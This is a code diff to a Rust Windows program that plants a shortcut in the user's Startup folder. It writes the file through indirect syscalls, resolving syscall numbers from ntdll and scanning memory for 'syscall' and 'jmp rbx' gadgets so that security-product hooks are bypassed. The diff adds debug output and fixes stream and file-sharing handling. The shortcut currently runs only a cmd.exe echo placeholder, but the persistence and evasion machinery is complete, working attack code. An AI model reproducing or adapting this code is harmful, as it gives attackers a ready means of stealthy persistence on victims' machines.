@@ -95,7 +95,6 @@ struct IShellLinkWVtbl {
     SetShowCmd: usize,
     GetIconLocation: usize,
     SetIconLocation: usize,
-    GetRelativePath: usize,
     SetRelativePath: usize,
     Resolve: usize,
     SetPath: unsafe extern "system" fn(*mut c_void, *const u16) -> i32,
@@ -123,7 +122,7 @@ struct IStreamVtbl {
     Seek: usize,
     SetSize: usize,
     CopyTo: usize,
-    Commit: usize,
+    Commit: unsafe extern "system" fn(*mut c_void, u32) -> i32,
     Revert: usize,
     LockRegion: usize,
     UnlockRegion: usize,
@@ -171,24 +170,30 @@ fn main() {
     unsafe {
         // Initialize COM (STA)
         let hr = CoInitializeEx(null_mut(), COINIT_APARTMENTTHREADED as u32);
+        println!("[+] CoInitializeEx: 0x{:08X}", hr as u32);
         if hr < 0 && hr != -2147417850 { // -2147417850 is RPC_E_CHANGED_MODE (already initialized with different mode)
             return;
         }
 
         let ntdll_name = ['n' as u16, 't' as u16, 'd' as u16, 'l' as u16, 'l' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16];
         let ntdll_base = syscalls::get_module_base(&ntdll_name);
+        println!("[+] ntdll base: {:?}", ntdll_base);
         if ntdll_base.is_null() { return; }
 
         let nt_create_file_ssn = syscalls::get_ssn(ntdll_base as *const u8, "NtCreateFile").expect("Failed to get NtCreateFile SSN");
         let nt_write_file_ssn = syscalls::get_ssn(ntdll_base as *const u8, "NtWriteFile").expect("Failed to get NtWriteFile SSN");
         let nt_close_ssn = syscalls::get_ssn(ntdll_base as *const u8, "NtClose").expect("Failed to get NtClose SSN");
+        println!("[+] SSNs - NtCreateFile: 0x{:X}, NtWriteFile: 0x{:X}, NtClose: 0x{:X}", nt_create_file_ssn, nt_write_file_ssn, nt_close_ssn);
 
         let syscall_gadget = syscalls::find_gadget_globally(&[&[0x0F, 0x05, 0xC3]]).expect("Failed to find syscall gadget");
         let jmp_rbx_gadget = syscalls::find_gadget_globally(&[&[0xFF, 0xE3], &[0x53, 0xC3]]).expect("Failed to find jmp rbx gadget");
+        println!("[+] Gadgets - syscall: {:?}, jmp rbx: {:?}", syscall_gadget, jmp_rbx_gadget);
 
         let mut path_ptr: *mut u16 = null_mut();
         // Use KF_FLAG_CREATE to ensure it exists
-        if SHGetKnownFolderPath(&FOLDERID_Startup, KF_FLAG_CREATE as u32, 0, &mut path_ptr) != S_OK {
+        let hr_path = SHGetKnownFolderPath(&FOLDERID_Startup, KF_FLAG_CREATE as u32, 0, &mut path_ptr);
+        println!("[+] SHGetKnownFolderPath: 0x{:08X}", hr_path as u32);
+        if hr_path != S_OK {
             return;
         }
 
@@ -207,9 +212,12 @@ fn main() {
         full_path_wide.push(0);
 
         let unicode_startup = create_unicode_string(&full_path_wide);
+        println!("[+] Target NT path: {}", String::from_utf16_lossy(&full_path_wide));
 
         let mut shell_link_ptr: *mut c_void = null_mut();
-        if CoCreateInstance(&CLSID_ShellLink, null_mut(), CLSCTX_ALL, &IID_IShellLinkW, &mut shell_link_ptr) == S_OK {
+        let hr_link = CoCreateInstance(&CLSID_ShellLink, null_mut(), CLSCTX_ALL, &IID_IShellLinkW, &mut shell_link_ptr);
+        println!("[+] CoCreateInstance (ShellLink): 0x{:08X}", hr_link as u32);
+        if hr_link == S_OK {
             let shell_link_vtbl = *(shell_link_ptr as *mut *mut IShellLinkWVtbl);
 
             // Set target path to cmd.exe and args to echo "test" to ensure it runs as a command
@@ -218,20 +226,32 @@ fn main() {
             let desc = "Echo Test Shortcut".encode_utf16().chain(std::iter::once(0)).collect::<Vec<u16>>();
             let work_dir = "C:\\Windows\\System32".encode_utf16().chain(std::iter::once(0)).collect::<Vec<u16>>();
 
-            ((*shell_link_vtbl).SetPath)(shell_link_ptr, target_path.as_ptr());
-            ((*shell_link_vtbl).SetArguments)(shell_link_ptr, args.as_ptr());
-            ((*shell_link_vtbl).SetDescription)(shell_link_ptr, desc.as_ptr());
-            ((*shell_link_vtbl).SetWorkingDirectory)(shell_link_ptr, work_dir.as_ptr());
+            let hr_set_path = ((*shell_link_vtbl).SetPath)(shell_link_ptr, target_path.as_ptr());
+            let hr_set_args = ((*shell_link_vtbl).SetArguments)(shell_link_ptr, args.as_ptr());
+            let hr_set_desc = ((*shell_link_vtbl).SetDescription)(shell_link_ptr, desc.as_ptr());
+            let hr_set_work = ((*shell_link_vtbl).SetWorkingDirectory)(shell_link_ptr, work_dir.as_ptr());
+            println!("[+] SetPath: 0x{:08X}, SetArguments: 0x{:08X}, SetDescription: 0x{:08X}, SetWorkingDirectory: 0x{:08X}", hr_set_path as u32, hr_set_args as u32, hr_set_desc as u32, hr_set_work as u32);
 
             let mut persist_stream_ptr: *mut c_void = null_mut();
-            if ((*shell_link_vtbl).QueryInterface)(shell_link_ptr, &IID_IPersistStream, &mut persist_stream_ptr) == S_OK {
+            let hr_qi = ((*shell_link_vtbl).QueryInterface)(shell_link_ptr, &IID_IPersistStream, &mut persist_stream_ptr);
+            println!("[+] QueryInterface (IPersistStream): 0x{:08X}", hr_qi as u32);
+            if hr_qi == S_OK {
                 let persist_stream_vtbl = *(persist_stream_ptr as *mut *mut IPersistStreamVtbl);
                 let mut stream: *mut IStream = null_mut();
-                if CreateStreamOnHGlobal(null_mut(), 1, &mut stream) == S_OK {
-                    if ((*persist_stream_vtbl).Save)(persist_stream_ptr, stream, 1) == S_OK {
+                let hr_stream = CreateStreamOnHGlobal(null_mut(), 1, &mut stream);
+                println!("[+] CreateStreamOnHGlobal: 0x{:08X}", hr_stream as u32);
+                if hr_stream == S_OK {
+                    let hr_save = ((*persist_stream_vtbl).Save)(persist_stream_ptr, stream, 1);
+                    println!("[+] IPersistStream::Save: 0x{:08X}", hr_save as u32);
+                    if hr_save == S_OK {
                         let stream_vtbl = *(stream as *mut *mut IStreamVtbl);
+                        let hr_commit = ((*stream_vtbl).Commit)(stream as *mut _, 0);
+                        println!("[+] IStream::Commit: 0x{:08X}", hr_commit as u32);
+
                         let mut stat = std::mem::zeroed::<STATSTG>();
-                        if ((*stream_vtbl).Stat)(stream as *mut _, &mut stat, 1) == S_OK {
+                        let hr_stat = ((*stream_vtbl).Stat)(stream as *mut _, &mut stat, 1);
+                        println!("[+] IStream::Stat: 0x{:08X}, cbSize: {}", hr_stat as u32, stat.cbSize);
+                        if hr_stat == S_OK {
                             let mut hglobal: *mut c_void = null_mut();
                             GetHGlobalFromStream(stream, &mut hglobal);
                             let data_ptr = GlobalLock(hglobal);
@@ -257,18 +277,19 @@ fn main() {
                                     &mut io_status as *mut _ as usize,
                                     0, // AllocationSize
                                     FILE_ATTRIBUTE_NORMAL as usize,
-                                    0, // ShareAccess
+                                    3, // ShareAccess (FILE_SHARE_READ | FILE_SHARE_WRITE)
                                     FILE_OVERWRITE_IF as usize,
                                     (FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT) as usize,
                                     0, // EaBuffer
                                     0  // EaLength
                                 );
+                                println!("[+] NtCreateFile status: 0x{:08X}", status as u32);
 
                                 if status == 0 {
                                     let mut write_io_status = IO_STATUS_BLOCK { Status: 0, Information: 0 };
                                     let byte_offset: i64 = 0;
                                     let mut write_byte_offset = byte_offset; // Local copy to be sure
-                                    crate::syscall!(
+                                    let write_status = crate::syscall!(
                                         nt_write_file_ssn,
                                         syscall_gadget,
                                         jmp_rbx_gadget,
@@ -282,6 +303,7 @@ fn main() {
                                         &mut write_byte_offset as *mut _ as usize,
                                         0  // Key
                                     );
+                                    println!("[+] NtWriteFile status: 0x{:08X}", write_status as u32);
                                     crate::syscall!(nt_close_ssn, syscall_gadget, jmp_rbx_gadget, out_handle as usize);
                                 }
                                 GlobalUnlock(hglobal);
